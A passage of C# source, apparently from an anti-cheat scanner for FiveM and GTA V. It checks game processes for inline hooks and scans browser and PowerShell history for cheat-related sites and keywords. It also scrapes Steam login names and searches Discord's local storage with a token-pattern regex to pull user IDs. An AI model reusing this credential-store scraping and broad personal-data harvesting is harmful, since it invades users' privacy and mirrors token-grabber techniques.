                    .Where(p => p.ProcessName.ToLower().Contains("fivem") || 
                               p.ProcessName.ToLower().Contains("gta"))
                    .Take(3)
                    .ToList();

                foreach (var proc in targetProcesses)
                {
                    try
                    {
                        processNames.Add(proc.ProcessName);

                        var hooks = CheckForInlineHooks(proc);
                        hookFindings.AddRange(hooks);

                        foreach (var hook in hooks)
                        {
                            // Get execution instance status
                            var procPath = proc.MainModule?.FileName ?? "Unknown";
                            var instanceStatus = procPath != "Unknown" ? GetExecutionInstanceStatus(procPath) : "Out of instance";
                            
                            _findings.Add(new
                            {
                                category = "Memory Hook",
                                name = "Inline Hook Detected",
                                severity = "Critical",
                                path = procPath,
                                action = "Detected",
                                source_type = "Hook Detection",
                                last_execution_time = instanceStatus
                            });
                        }
                    }
                    catch { }
                }

                var hookEvents = AnalyzeHookRelatedEventLogs(processNames, TimeSpan.FromHours(24));
                if (hookEvents.Count > 0)
                {
                    _artifacts["HOOK_EVENT_LOGS"] = hookEvents.Cast<object>().ToList();
                    foreach (var evt in hookEvents)
                    {
                        _findings.Add(new
                        {
                            category = "Event Logs",
                            name = "Hook-Related Event",
                            severity = "Medium",
                            path = "Event Logs",
                            action = "Tampering evidence detected",
                            source_type = "EventLog",
                            description = evt.Description,
                            status = evt.Status,
                            details = evt.Details,
                            last_execution_time = "N/A" // Event logs don't have file execution time
                        });
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"??  Error checking hooks: {ex.Message}");
            }

            if (hookFindings.Count > 0)
            {
                _artifacts["MEMORY_HOOKS"] = hookFindings;
            }

            Console.WriteLine($"? Checked for hooks, found {hookFindings.Count} suspicious modifications");
        }

        private List<object> CheckForInlineHooks(Process process)
        {
            var hooks = new List<object>();
            IntPtr processHandle = IntPtr.Zero;

            try
            {
                processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, process.Id);
                if (processHandle == IntPtr.Zero)
                    return hooks;

                ProcessModuleCollection moduleCollection;
                try
                {
                    moduleCollection = process.Modules;
                }
                catch
                {
                    return hooks;
                }

                var moduleList = moduleCollection.Cast<ProcessModule>().ToList();
                var moduleLookup = moduleList
                    .Where(m => m?.ModuleName != null)
                    .GroupBy(m => m.ModuleName!, StringComparer.OrdinalIgnoreCase)
                    .ToDictionary(g => g.Key, g => g.First(), StringComparer.OrdinalIgnoreCase);

                foreach (var dll in CheatDatabase.CriticalFunctionsToCheck)
                {
                    if (!moduleLookup.TryGetValue(dll.Key, out var remoteModule))
                        continue;

                    foreach (var funcName in dll.Value)
                    {
                        try
                        {
                            var remoteAddress = GetRemoteFunctionAddress(remoteModule, dll.Key, funcName);
                            if (remoteAddress == null) continue;

                            var buffer = new byte[16];
                            if (!ReadProcessMemory(processHandle, remoteAddress.Value, buffer, buffer.Length, out int bytesRead) || bytesRead == 0)
                                continue;

                            if (TryComputeHookTarget(processHandle, buffer, remoteAddress.Value, out long targetAddr, out string signature))
                            {
                                var targetInfo = ResolveModuleInfo(moduleList, new IntPtr(targetAddr));
                                var targetModule = targetInfo?.Name ?? "Unknown";
                                var targetPath = targetInfo?.Path ?? "Unknown";
                                var targetCompany = targetInfo?.Company ?? "Unknown";

                                if (IsTrustedHookTarget(targetModule, targetCompany))
                                    continue;

                                hooks.Add(new
                                {
                                    description = $"Potential inline hook detected on `{dll.Key}!{funcName}`",
                                    details = new
                                    {
                                        function = funcName,
                                        module = dll.Key,
                                        signature,
                                        target_module = targetModule,
                                        target_path = targetPath,
                                        target_company = targetCompany,
                                        target_address = $"0x{targetAddr:X}",
                                        pid = process.Id,
                                        process = process.ProcessName
                                    },
                                    status = "critical"
                                });

                                _behaviorEngine.RecordEvent(process.ProcessName, $"InlineHook:{dll.Key}!{funcName}->{targetModule}");
                            }
                        }
                        catch { }
                    }
                }
            }
            finally
            {
                if (processHandle != IntPtr.Zero)
                {
                    CloseHandle(processHandle);
                }
            }

            return hooks;
        }

        private async Task CheckCriticalServices()
        {
            var serviceFindings = new List<object>();

            try
            {
                var criticalServices = new Dictionary<string, string>
                {
                    { "SysMain", "Superfetch/Prefetch" },
                    { "DPS", "Diagnostic Policy Service" },
                    { "WinDefend", "Windows Defender" },
                    { "wuauserv", "Windows Update" },
                    { "BFE", "Base Filtering Engine" },
                    { "EventLog", "Windows Event Log" }
                };

                foreach (var service in criticalServices)
                {
                    try
                    {
                        var sc = System.ServiceProcess.ServiceController.GetServices()
                            .FirstOrDefault(s => s.ServiceName.Equals(service.Key, StringComparison.OrdinalIgnoreCase));

                        if (sc != null)
                        {
                            if (sc.Status == System.ServiceProcess.ServiceControllerStatus.Stopped)
                            {
                                serviceFindings.Add(new
                                {
                                    description = $"Critical service `{service.Key}` ({service.Value}) is stopped",
                                    details = new
                                    {
                                        service_name = service.Key,
                                        description = service.Value,
                                        status = sc.Status.ToString()
                                    },
                                    status = "warning"
                                });

                                _findings.Add(new
                                {
                                    category = "Service Tampering",
                                    name = $"Service Stopped: {service.Key}",
                                    severity = "Medium",
                                    path = "N/A",
                                    action = "Detected",
                                    source_type = "Service Check",
                                    last_execution_time = "N/A" // Services don't have file execution time
                                });
                            }
                        }
                    }
                    catch { }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"??  Error checking services: {ex.Message}");
            }

            if (serviceFindings.Count > 0)
            {
                _artifacts["SYSTEM_INTEGRITY_CHECKS"] = serviceFindings;
            }

            Console.WriteLine($"? Checked critical services, found {serviceFindings.Count} issues");
        }

        private string CleanUrl(string url)
        {
            if (string.IsNullOrWhiteSpace(url)) return string.Empty;
            return System.Text.RegularExpressions.Regex.Replace(url, @"[^\w\-._~:/?#\[\]@!$&'()*+,;=%]+$", "");
        }

        private bool HostMatchesCheatDomain(string host, string domainPattern)
        {
            if (string.IsNullOrWhiteSpace(host) || string.IsNullOrWhiteSpace(domainPattern)) return false;
            host = host.Trim().ToLowerInvariant();
            domainPattern = domainPattern.Trim().ToLowerInvariant();

            if (host == domainPattern) return true;
            if (host.EndsWith("." + domainPattern)) return true;
            return domainPattern.Length >= 5 && host.Contains(domainPattern);
        }

        private bool IsLegitimateHost(string host)
        {
            if (string.IsNullOrWhiteSpace(host)) return false;
            host = host.ToLowerInvariant();
            return _legitimateDomainKeywords.Any(ld => host.Contains(ld));
        }

        private IEnumerable<string> ExtractUrlsFromHistoryFile(string historyPath)
        {
            var urls = new List<string>();
            var tempPath = System.IO.Path.GetTempFileName();

            try
            {
                System.IO.File.Copy(historyPath, tempPath, true);
                var bytes = System.IO.File.ReadAllBytes(tempPath);
                string content;

                try
                {
                    content = Encoding.UTF8.GetString(bytes, 0, bytes.Length);
                }
                catch
                {
                    content = Encoding.ASCII.GetString(bytes, 0, bytes.Length);
                }

                foreach (System.Text.RegularExpressions.Match match in _urlExtractionRegex.Matches(content))
                {
                    var cleaned = CleanUrl(match.Value);
                    if (!string.IsNullOrEmpty(cleaned))
                    {
                        urls.Add(cleaned);
                    }
                }
            }
            catch { }
            finally
            {
                try { System.IO.File.Delete(tempPath); } catch { }
            }

            return urls;
        }

        private void EvaluateUrls(string browserName, IEnumerable<string> urls, List<object> browserActivity, HashSet<string> reportedSites)
        {
            var browserFoundSites = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

            foreach (var url in urls)
            {
                if (!Uri.TryCreate(url, UriKind.Absolute, out var uri)) continue;
                var host = uri.Host?.Trim().ToLowerInvariant();
                if (string.IsNullOrWhiteSpace(host)) continue;
                if (IsLegitimateHost(host)) continue;

                foreach (var pattern in _cheatSitePatterns)
                {
                    if (reportedSites.Contains(pattern.Label) || browserFoundSites.Contains(pattern.Label)) continue;

                    if (pattern.Domains.Any(domain => HostMatchesCheatDomain(host, domain)))
                    {
                        browserFoundSites.Add(pattern.Label);
                        reportedSites.Add(pattern.Label);

                        browserActivity.Add(new
                        {
                            description = $"Visited cheat-related site: {pattern.Label}",
                            details = $"URL: {url}\nHost: {host}\nBrowser: {browserName}",
                            status = pattern.Severity.Equals("High", StringComparison.OrdinalIgnoreCase) ? "warning" : "info",
                            url = url,
                            host = host
                        });

                        _findings.Add(new
                        {
                            category = "Browser Activity",
                            name = $"Cheat Site: {pattern.Label}",
                            severity = pattern.Severity,
                            path = url,
                            action = "Detected",
                            source_type = "Browser",
                            host = host,
                            confidence_score = pattern.Severity.Equals("High", StringComparison.OrdinalIgnoreCase) ? 80 : 60
                        });
                    }
                }
            }
        }

        private void ProcessBrowserHistoryFile(string browserName, string historyPath, List<object> browserActivity, HashSet<string> reportedSites)
        {
            if (!System.IO.File.Exists(historyPath)) return;
            var urls = ExtractUrlsFromHistoryFile(historyPath);
            EvaluateUrls(browserName, urls, browserActivity, reportedSites);
        }

        private async Task ScanBrowserHistory()
        {
            var browserActivity = new List<object>();
            var reportedSites = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

            try
            {
                var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                var chromePath = System.IO.Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data\Default\History");
                var edgePath = System.IO.Path.Combine(userProfile, @"AppData\Local\Microsoft\Edge\User Data\Default\History");

                ProcessBrowserHistoryFile("Chrome", chromePath, browserActivity, reportedSites);
                ProcessBrowserHistoryFile("Edge", edgePath, browserActivity, reportedSites);
            }
            catch { }

            if (browserActivity.Count > 0)
            {
                _artifacts["BROWSER_ACTIVITY"] = browserActivity;
                Console.WriteLine($"?? Browser Activity Data: {Newtonsoft.Json.JsonConvert.SerializeObject(browserActivity.Take(2))}");
            }

            Console.WriteLine($"? Scanned browser history, found {browserActivity.Count} cheat-related visits");
        }

        private async Task ScanCommandHistory()
        {
            var commandActivity = new List<object>();
            var suspiciousCommands = new[]
            {
                "eulen", "420", "cherax", "stand", "midnight", "impulse", "phantom",
                "inject", "dll", "cheat", "hack", "mod menu", "trainer"
            };

            try
            {
                var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                
                // PowerShell history
                var psHistoryPath = System.IO.Path.Combine(userProfile, @"AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt");
                if (System.IO.File.Exists(psHistoryPath))
                {
                    try
                    {
                        var lines = System.IO.File.ReadAllLines(psHistoryPath);
                        foreach (var line in lines)
                        {
                            var lineLower = line.ToLower();
                            foreach (var keyword in suspiciousCommands)
                            {
                                if (lineLower.Contains(keyword.ToLower()))
                                {
                                    commandActivity.Add(new
                                    {
                                        description = $"Suspicious PowerShell command containing '{keyword}'",
                                        details = $"Command: {line}",
                                        status = "threat"
                                    });

                                    _findings.Add(new
                                    {
                                        category = "Command History",
                                        name = $"PowerShell: {keyword}",
                                        severity = "Medium",
                                        path = "PowerShell History",
                                        action = "Detected",
                                        source_type = "Command"
                                    });
                                    break;
                                }
                            }
                        }
                    }
                    catch { }
                }

                // CMD history (from registry)
                try
                {
                    using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"))
                    {
                        if (key != null)
                        {
                            foreach (var valueName in key.GetValueNames())
                            {
                                var value = key.GetValue(valueName)?.ToString()?.ToLower();
                                if (value != null)
                                {
                                    foreach (var keyword in suspiciousCommands)
                                    {
                                        if (value.Contains(keyword.ToLower()))
                                        {
                                            commandActivity.Add(new
                                            {
                                                description = $"Suspicious Run command containing '{keyword}'",
                                                details = $"Command: {value}",
                                                status = "threat"
                                            });

                                            _findings.Add(new
                                            {
                                                category = "Command History",
                                                name = $"Run Command: {keyword}",
                                                severity = "Medium",
                                                path = "Windows Run History",
                                                action = "Detected",
                                                source_type = "Command"
                                            });
                                            break;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                catch { }
            }
            catch { }

            if (commandActivity.Count > 0)
            {
                _artifacts["COMMAND_HISTORY"] = commandActivity;
                Console.WriteLine($"?? Command History Data: {Newtonsoft.Json.JsonConvert.SerializeObject(commandActivity.Take(2))}");
            }

            Console.WriteLine($"? Scanned command history, found {commandActivity.Count} suspicious commands");
        }

        private async Task ScanGameFiles()
        {
            var gameAnalysis = new List<object>();

            try
            {
                // Get all available drives
                var drives = DriveInfo.GetDrives()
                    .Where(d => d.IsReady && d.DriveType == DriveType.Fixed)
                    .Select(d => d.Name)
                    .ToList();

                // Build paths to check on all drives
                var fiveMPaths = new List<string>();
                var gtaVPaths = new List<string>();

                foreach (var drive in drives)
                {
                    // FiveM paths
                    fiveMPaths.Add(System.IO.Path.Combine(drive, "FiveM"));
                    fiveMPaths.Add(System.IO.Path.Combine(drive, "FiveM", "FiveM.app"));
                    
                    // GTA V paths
                    gtaVPaths.Add(System.IO.Path.Combine(drive, "Program Files", "Rockstar Games", "Grand Theft Auto V"));
                    gtaVPaths.Add(System.IO.Path.Combine(drive, "Program Files (x86)", "Steam", "steamapps", "common", "Grand Theft Auto V"));
                    gtaVPaths.Add(System.IO.Path.Combine(drive, "Program Files", "Epic Games", "GTAV"));
                    gtaVPaths.Add(System.IO.Path.Combine(drive, "SteamLibrary", "steamapps", "common", "Grand Theft Auto V"));
                }

                // Add common AppData paths for FiveM
                fiveMPaths.Add(System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "FiveM"));
                fiveMPaths.Add(System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "CitizenFX"));

                var gamePaths = new Dictionary<string, string[]>
                {
                    { "FiveM", fiveMPaths.ToArray() },
                    { "GTA V", gtaVPaths.ToArray() }
                };

                foreach (var game in gamePaths)
                {
                    foreach (var basePath in game.Value)
                    {
                        if (System.IO.Directory.Exists(basePath))
                        {
                            gameAnalysis.Add(new
                            {
                                description = $"{game.Key} installation found",
                                details = $"Path: {basePath}",
                                status = "info"
                            });

                            // Check for mods folder
                            var modsPath = System.IO.Path.Combine(basePath, "mods");
                            if (System.IO.Directory.Exists(modsPath))
                            {
                                try
                                {
                                    var modFiles = System.IO.Directory.GetFiles(modsPath, "*.*", System.IO.SearchOption.AllDirectories)
                                        .Take(150); // Limit to 150 files

                                    var modFileCount = 0;
                                    var rpfCount = 0;
                                    var dllCount = 0;
                                    
                                    foreach (var modFile in modFiles)
                                    {
                                        var fileName = System.IO.Path.GetFileName(modFile);
                                        var extension = System.IO.Path.GetExtension(modFile).ToLower();

                                        // Log all relevant mod files including RPF archives
                                        if (extension == ".dll" || extension == ".asi" || extension == ".lua" || extension == ".js" || extension == ".rpf")
                                        {
                                            modFileCount++;
                                            
                                            if (extension == ".rpf") rpfCount++;
                                            if (extension == ".dll") dllCount++;
                                            
                                            var status = (extension == ".dll" || extension == ".asi") ? "warning" : "info";
                                            
                                            gameAnalysis.Add(new
                                            {
                                                description = $"Mod file: {fileName}",
                                                details = $"Path: {modFile}\nType: {extension.ToUpper()}",
                                                status = status
                                            });

                                            _findings.Add(new
                                            {
                                                category = "Game Modifications",
                                                name = $"Mod File: {fileName}",
                                                severity = (extension == ".dll" || extension == ".asi") ? "Medium" : "Low",
                                                path = modFile,
                                                action = "Detected",
                                                source_type = "Game Mod"
                                            });
                                        }
                                    }
                                    
                                    if (modFileCount > 0)
                                    {
                                        var details = $"Path: {modsPath}\nTotal files: {modFileCount}";
                                        if (rpfCount > 0) details += $"\nRPF archives: {rpfCount}";
                                        if (dllCount > 0) details += $"\nDLL files: {dllCount}";
                                        
                                        gameAnalysis.Add(new
                                        {
                                            description = $"Mods folder contains {modFileCount} modification files",
                                            details = details,
                                            status = "info"
                                        });
                                    }
                                }
                                catch { }
                            }

                            // Check for plugins folder
                            var pluginsPath = System.IO.Path.Combine(basePath, "plugins");
                            if (System.IO.Directory.Exists(pluginsPath))
                            {
                                try
                                {
                                    var pluginFiles = System.IO.Directory.GetFiles(pluginsPath, "*.*", System.IO.SearchOption.AllDirectories)
                                        .Take(150); // Limit to 150 files

                                    var pluginFileCount = 0;
                                    var dllCount = 0;
                                    var asiCount = 0;
                                    
                                    foreach (var pluginFile in pluginFiles)
                                    {
                                        var fileName = System.IO.Path.GetFileName(pluginFile);
                                        var extension = System.IO.Path.GetExtension(pluginFile).ToLower();

                                        // Focus on DLL and ASI files primarily, but log others too
                                        if (extension == ".dll" || extension == ".asi" || extension == ".lua" || extension == ".js")
                                        {
                                            pluginFileCount++;
                                            
                                            if (extension == ".dll") dllCount++;
                                            if (extension == ".asi") asiCount++;
                                            
                                            // DLL and ASI are more suspicious
                                            var status = (extension == ".dll" || extension == ".asi") ? "warning" : "info";
                                            var severity = (extension == ".dll" || extension == ".asi") ? "Medium" : "Low";
                                            
                                            gameAnalysis.Add(new
                                            {
                                                description = $"Plugin: {fileName}",
                                                details = $"Path: {pluginFile}\nType: {extension.ToUpper()}",
                                                status = status
                                            });

                                            _findings.Add(new
                                            {
                                                category = "Game Plugins",
                                                name = $"Plugin: {fileName}",
                                                severity = severity,
                                                path = pluginFile,
                                                action = "Detected",
                                                source_type = "Game Plugin"
                                            });
                                        }
                                    }
                                    
                                    if (pluginFileCount > 0)
                                    {
                                        var details = $"Path: {pluginsPath}\nTotal files: {pluginFileCount}";
                                        if (dllCount > 0) details += $"\nDLL files: {dllCount}";
                                        if (asiCount > 0) details += $"\nASI files: {asiCount}";
                                        
                                        gameAnalysis.Add(new
                                        {
                                            description = $"Plugins folder contains {pluginFileCount} plugin files",
                                            details = details,
                                            status = "info"
                                        });
                                    }
                                }
                                catch { }
                            }

                            // Check for FiveM resources folder
                            if (game.Key == "FiveM")
                            {
                                var resourcesPath = System.IO.Path.Combine(basePath, "FiveM.app", "resources");
                                if (System.IO.Directory.Exists(resourcesPath))
                                {
                                    try
                                    {
                                        var resourceFolders = System.IO.Directory.GetDirectories(resourcesPath)
                                            .Take(50); // Limit to 50 folders

                                        foreach (var resourceFolder in resourceFolders)
                                        {
                                            var resourceName = System.IO.Path.GetFileName(resourceFolder);
                                            
                                            // Check for suspicious resource names
                                            var suspiciousNames = new[] { "cheat", "hack", "menu", "mod", "trainer", "injector" };
                                            var isSuspicious = suspiciousNames.Any(s => resourceName.ToLower().Contains(s));
                                            
                                            if (isSuspicious)
                                            {
                                                gameAnalysis.Add(new
                                                {
                                                    description = $"Suspicious FiveM resource: {resourceName}",
                                                    details = $"Path: {resourceFolder}",
                                                    status = "threat"
                                                });

                                                _findings.Add(new
                                                {
                                                    category = "FiveM Resources",
                                                    name = $"Suspicious Resource: {resourceName}",
                                                    severity = "High",
                                                    path = resourceFolder,
                                                    action = "Detected",
                                                    source_type = "FiveM Resource"
                                                });
                                            }
                                            else
                                            {
                                                // Log all resources for visibility
                                                gameAnalysis.Add(new
                                                {
                                                    description = $"FiveM resource: {resourceName}",
                                                    details = $"Path: {resourceFolder}",
                                                    status = "info"
                                                });
                                            }
                                        }
                                    }
                                    catch { }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"??  Error scanning game files: {ex.Message}");
            }

            if (gameAnalysis.Count > 0)
            {
                _artifacts["GAME_ANALYSIS"] = gameAnalysis;
            }

            Console.WriteLine($"? Scanned game files, found {gameAnalysis.Count} items");
        }

        private async Task ScanHardware()
        {
            try
            {
                var hardwareInfo = HardwareScanner.GetHardwareInfo();
                
                // Convert to the format expected by the server (key/value pairs)
                var formattedHardware = hardwareInfo.Select(hw => new
                {
                    key = hw.Name,
                    value = hw.Details
                }).Cast<object>().ToList();
                
                _artifacts["HARDWARE_AND_PERIPHERALS"] = formattedHardware;
                Console.WriteLine($"? Collected {hardwareInfo.Count} hardware devices");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"??  Error scanning hardware: {ex.Message}");
            }
        }

        private List<object> GetHardwareInfo()
        {
            var hardwareInfo = new List<object>();
            try
            {
                var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_PnPEntity");
                foreach (ManagementObject device in searcher.Get())
                {
                    try
                    {
                        string name = device.GetPropertyValue("Name")?.ToString() ?? "Unknown";
                        string pnpClass = device.GetPropertyValue("PNPClass")?.ToString() ?? "Unknown";
                        string manufacturer = device.GetPropertyValue("Manufacturer")?.ToString() ?? "Unknown";
                        string deviceId = device.GetPropertyValue("DeviceID")?.ToString() ?? "Unknown";

                        hardwareInfo.Add(new
                        {
                            name = name,
                            details = new
                            {
                                type = pnpClass,
                                manufacturer = manufacturer,
                                device_id = deviceId
                            }
                        });
                    }
                    catch { }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error collecting hardware info: {ex.Message}");
            }
            return hardwareInfo;
        }

        private async Task CollectSystemInfo()
        {
            var systemInfo = new List<object>();

            try
            {
                // Basic System Info
                systemInfo.Add(new { key = "Computer Name", value = Environment.MachineName });
                systemInfo.Add(new { key = "User Name", value = Environment.UserName });
                systemInfo.Add(new { key = "OS Version", value = GetOSVersion() });

                // CPU Info
                var cpuInfo = GetCPUInfo();
                if (!string.IsNullOrEmpty(cpuInfo))
                {
                    systemInfo.Add(new { key = "CPU Info", value = cpuInfo });
                }

                // RAM Total
                var ramTotal = GetTotalRAM();
                if (!string.IsNullOrEmpty(ramTotal))
                {
                    systemInfo.Add(new { key = "RAM Total", value = ramTotal });
                }

                // Hardware ID (UUID)
                var hardwareId = GetHardwareId();
                if (!string.IsNullOrEmpty(hardwareId))
                {
                    systemInfo.Add(new { key = "Hardware ID", value = hardwareId });
                }

                // Uptime
                var uptime = GetSystemUptime();
                systemInfo.Add(new { key = "Uptime", value = uptime });

                // Antivirus
                var antivirus = GetAntivirusInfo();
                if (!string.IsNullOrEmpty(antivirus))
                {
                    systemInfo.Add(new { key = "Antivirus", value = antivirus });
                }

                // Steam Persona Name
                var steamName = GetSteamPersonaName();
                if (!string.IsNullOrEmpty(steamName))
                {
                    systemInfo.Add(new { key = "Steam PersonaName", value = steamName });
                }

                // Discord Info
                var discordInfo = GetDiscordInfo();
                if (discordInfo.HasValue)
                {
                    systemInfo.Add(new { key = "Discord Username", value = discordInfo.Value.username });
                    systemInfo.Add(new { key = "Discord User ID", value = discordInfo.Value.userId });
                }

                // Windows User Account
                systemInfo.Add(new { key = "Windows Username", value = Environment.UserName });
            }
            catch (Exception ex)
            {
                Console.WriteLine($"??  Error collecting system info: {ex.Message}");
            }

            _artifacts["SYSTEM_INFORMATION"] = systemInfo;
            Console.WriteLine($"? Collected {systemInfo.Count} system information entries");
        }

        private string GetOSVersion()
        {
            try
            {
                using (var searcher = new System.Management.ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
                {
                    foreach (var os in searcher.Get())
                    {
                        var caption = os["Caption"]?.ToString() ?? "";
                        var version = os["Version"]?.ToString() ?? "";
                        var buildNumber = os["BuildNumber"]?.ToString() ?? "";
                        return $"{caption}-{version}-{buildNumber}";
                    }
                }
            }
            catch { }
            return Environment.OSVersion.ToString();
        }

        private string GetCPUInfo()
        {
            try
            {
                using (var searcher = new System.Management.ManagementObjectSearcher("SELECT * FROM Win32_Processor"))
                {
                    foreach (var cpu in searcher.Get())
                    {
                        return cpu["Name"]?.ToString() ?? "Unknown CPU";
                    }
                }
            }
            catch { }
            return "Unknown CPU";
        }



        private string? GetSteamPersonaName()
        {
            try
            {
                var steamAccounts = new List<string>();
                
                // Method 1: Try to read from Steam registry
                try
                {
                    using (var steamKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Valve\Steam"))
                    {
                        if (steamKey != null)
                        {
                            var personaName = steamKey.GetValue("PersonaName")?.ToString();
                            if (!string.IsNullOrEmpty(personaName))
                            {
                                steamAccounts.Add(personaName);
                            }
                        }
                    }
                }
                catch { }

                // Method 2: Try to find all Steam accounts from loginusers.vdf
                try
                {
                    // Try multiple possible Steam paths
                    var possibleSteamPaths = new List<string>();
                    
                    // From registry
                    try
                    {
                        using (var steamKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Valve\Steam"))
                        {
                            var steamPath = steamKey?.GetValue("SteamPath")?.ToString();
                            if (!string.IsNullOrEmpty(steamPath))
                            {
                                possibleSteamPaths.Add(steamPath);
                            }
                        }
                    }
                    catch { }
                    
                    // Common default paths
                    possibleSteamPaths.Add(@"C:\Program Files (x86)\Steam");
                    possibleSteamPaths.Add(@"C:\Program Files\Steam");
                    
                    foreach (var steamPath in possibleSteamPaths)
                    {
                        var loginUsersPath = System.IO.Path.Combine(steamPath, "config", "loginusers.vdf");
                        if (System.IO.File.Exists(loginUsersPath))
                        {
                            var content = System.IO.File.ReadAllText(loginUsersPath, Encoding.UTF8);
                            
                            // Extract PersonaName (display name)
                            var personaMatches = System.Text.RegularExpressions.Regex.Matches(content, @"""PersonaName""\s+""([^""]+)""");
                            foreach (System.Text.RegularExpressions.Match match in personaMatches)
                            {
                                var personaName = match.Groups[1].Value;
                                if (!string.IsNullOrEmpty(personaName) && !steamAccounts.Contains(personaName))
                                {
                                    steamAccounts.Add(personaName);
                                }
                            }
                            
                            // Extract AccountName (login name)
                            var accountMatches = System.Text.RegularExpressions.Regex.Matches(content, @"""AccountName""\s+""([^""]+)""");
                            foreach (System.Text.RegularExpressions.Match match in accountMatches)
                            {
                                var accountName = match.Groups[1].Value;
                                if (!string.IsNullOrEmpty(accountName) && !steamAccounts.Contains(accountName))
                                {
                                    steamAccounts.Add(accountName);
                                }
                            }
                            
                            break; // Found the file, no need to check other paths
                        }
                    }
                }
                catch { }

                // Method 3: Check if Steam is running
                if (steamAccounts.Count == 0)
                {
                    try
                    {
                        var steamProcesses = System.Diagnostics.Process.GetProcessesByName("steam");
                        if (steamProcesses.Length > 0)
                        {
                            return "Steam User (running)";
                        }
                    }
                    catch { }
                }

                if (steamAccounts.Count > 0)
                {
                    return string.Join(", ", steamAccounts.Distinct());
                }
            }
            catch { }
            return null;
        }

        private (string username, string userId)? GetDiscordInfo()
        {
            try
            {
                // Discord paths to check
                var discordPaths = new Dictionary<string, string>
                {
                    { "Discord", System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord") },
                    { "Discord Canary", System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordcanary") },
                    { "Discord PTB", System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordptb") }
                };

                foreach (var discord in discordPaths)
                {
                    var leveldbPath = System.IO.Path.Combine(discord.Value, "Local Storage", "leveldb");
                    
                    if (!System.IO.Directory.Exists(leveldbPath))
                        continue;

                    try
                    {
                        // Get all .ldb and .log files
                        var files = System.IO.Directory.GetFiles(leveldbPath)
                            .Where(f => f.EndsWith(".ldb") || f.EndsWith(".log"))
                            .ToList();

                        foreach (var file in files)
                        {
                            try
                            {
                                var content = System.IO.File.ReadAllText(file, Encoding.UTF8);
                                
                                // Look for Discord token pattern: dQw4w9WgXcQ:
                                var tokenMatches = System.Text.RegularExpressions.Regex.Matches(content, @"dQw4w9WgXcQ:([A-Za-z0-9_\-\.]+)");
                                
                                if (tokenMatches.Count > 0)
                                {
                                    // Found Discord data, now extract user info
                                    // Look for user ID pattern (17-19 digits)
                                    var userIdMatches = System.Text.RegularExpressions.Regex.Matches(content, @"""id""\s*:\s*""(\d{17,19})""");
                                    
                                    if (userIdMatches.Count > 0)
                                    {
                                        var userId = userIdMatches[0].Groups[1].Value;
                                        
                                        // Try to find username
                                        var usernameMatch = System.Text.RegularExpressions.Regex.Match(
                                            content,
                                            @"""username""\s*:\s*""([^""]{2,32})"""
                                        );
                                        
                                        var username = usernameMatch.Success ? usernameMatch.Groups[1].Value : "Discord User";
                                        
                                        // Also try global_name
                                        if (username == "Discord User")
                                        {
                                            var globalNameMatch = System.Text.RegularExpressions.Regex.Match(
                                                content,
                                                @"""global_name""\s*:\s*""([^""]{2,32})"""
                                            );
                                            if (globalNameMatch.Success)
                                            {
                                                username = globalNameMatch.Groups[1].Value;
                                            }
                                        }
                                        
                                        return (username, userId);
                                    }
                                }
                            }
                            catch { }
                        }
                    }
                    catch { }
                }

                // Fallback: Check if Discord is running
                try
                {
                    var discordProcesses = System.Diagnostics.Process.GetProcessesByName("Discord");
                    if (discordProcesses.Length > 0)
                    {
                        return ("Discord User", "Running");
                    }
                }
                catch { }
            }
            catch { }
            
            return null;
        }

        private async Task ScanForCheats()
        {
            var hashMatches = new List<object>();
            var keywordMatches = new List<object>();
            var configFiles = new List<object>();
            var metadataMatches = new List<object>(); // New list
            var cheatCount = 0;

            // Search paths
            var searchPaths = new[]
            {
                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                Environment.GetEnvironmentVariable("TEMP") ?? @"C:\Windows\Temp"
            };

            var scannedFiles = 0;
            var maxFiles = 2000; // Limit total files scanned

            foreach (var searchPath in searchPaths)
            {
                if (!System.IO.Directory.Exists(searchPath)) continue;
                if (scannedFiles >= maxFiles) break;

                try
                {
                    var allFiles = System.IO.Directory.GetFiles(searchPath, "*.*", System.IO.SearchOption.AllDirectories)
                        .Where(f =>
                        {
                            try
                            {
                                var fi = new System.IO.FileInfo(f);
                                return fi.Length > 0 && fi.Length < 50 * 1024 * 1024; // 0-50MB
                            }
                            catch { return false; }
                        })
                        .Take(maxFiles - scannedFiles);

                    foreach (var file in allFiles)
                    {
                        scannedFiles++;
                        try
                        {
                            cheatCount = await ScanIndividualFile(file, hashMatches, keywordMatches, configFiles, metadataMatches, cheatCount); // Pass new list
                        }
                        catch { }
                    }
                }
                catch { }
            }

            // Store artifacts
            if (hashMatches.Count > 0)
                _artifacts["FILE_SYSTEM_HASH_MATCHES"] = hashMatches;
            if (keywordMatches.Count > 0)
